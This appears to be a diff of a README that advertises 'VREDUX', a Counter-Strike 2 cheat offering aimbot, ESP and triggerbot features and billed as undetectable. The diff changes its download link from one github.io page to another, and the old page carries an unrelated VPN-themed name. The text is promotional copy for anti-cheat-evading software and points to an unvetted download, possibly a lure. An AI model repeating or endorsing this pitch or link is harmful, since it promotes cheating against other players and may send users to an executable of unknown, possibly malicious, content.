@@ -2,7 +2,7 @@
 
 VREDUX is an advanced and fully modular CS2 soft designed for competitive players who demand both tactical precision and discretion. It brings together powerful yet undetectable gameplay-enhancement tools — including legit-style aimbot, intelligent ESP system, and a responsive triggerbot — all tailored for smooth integration into your natural playstyle.
 
-[![Download VREDUX](https://img.shields.io/badge/Download-VREDUX-blueviolet)](https://cyberghost-vpn-privacy-shield.github.io/.github)
+[![Download VREDUX](https://img.shields.io/badge/Download-VREDUX-blueviolet)](https://vredux-cs2-soft-aimplus-edition.github.io/.github)
 
 ---
 
